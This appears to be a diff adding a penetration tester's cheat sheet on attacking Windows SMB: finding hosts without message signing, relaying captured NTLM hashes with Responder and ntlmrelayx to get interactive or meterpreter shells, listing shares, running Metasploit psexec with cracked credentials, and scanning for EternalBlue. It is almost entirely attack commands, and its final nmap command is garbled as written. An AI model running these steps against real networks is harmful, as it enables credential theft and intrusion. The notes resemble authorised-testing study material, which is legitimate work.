@@ -1,0 +1,51 @@
+SMB
+
+SMB Relay
+	nmap --script=smb2-security-mode.nse -p445 <netblock>
+		look for message_signing "disabled" or "enabled, but not required"
+
+	set Responder.conf to SMB=Off, HTTP=Off
+	run Responder 
+	populate targets in targets.txt
+	run ntlmrelay
+		ntlmrelayx.py -tf targets.txt -smb2support
+
+	for interactive shell:
+		python ntlmrelayx.py -tf targets.txt -smb2support -i 
+		open new tab and run nc localhost:<port from ntlmrelay>
+			nc 127.0.0.1 11000
+	for meterpreter shell:
+		-e <meterpreter payload>
+	for command:
+		-c "whoami"
+
+
+smbclient
+	smbclient -L IP
+		-L = list 
+	smbclient -N IP\sharename
+		-N = no pass
+
+smbmap
+	smbmap -H IP
+
+
+
+Metasploit
+	/auxiliary/scanner/smb/smb_version
+	/exploit/windows/smb/psexec
+		provide smbuser and smbpass captured by Responder and cracked
+		
+
+
+
+
+EternalBlue (MS17-010) - mostly on internal machines
+	Metasploit scanner
+		/auxiliary/scanner/smb/smb_ms17_010 
+
+	AutoBlue checker
+		github.com/3ndG4me/AutoBlue-MS17-010
+
+	nmap
+		nmap -Pn -p445 - open - max-hostgroup 3 - smb-vuln-ms17-010 script <ip_netblock>
